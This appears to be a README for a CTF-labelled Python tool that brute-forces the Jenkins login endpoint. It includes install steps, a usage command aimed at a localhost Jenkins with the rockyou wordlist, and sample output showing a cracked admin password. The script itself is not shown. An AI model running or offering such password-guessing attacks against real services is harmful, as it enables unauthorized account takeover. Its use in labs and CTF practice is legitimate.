# Jenkins Brute Force (CTF Educational Tool)

## Installation
pip install requests colorama

## Usage
python3 brute.py -t http://localhost:8080/j_acegi_security_check -u admin -w /usr/share/wordlists/rockyou.txt

## Example Output
[-] Fail : 123456
[-] Fail : password
[+] Valid → admin:qwerty
Tried 52 passwords before success!

## Disclaimer 
	JUST FOR EDU !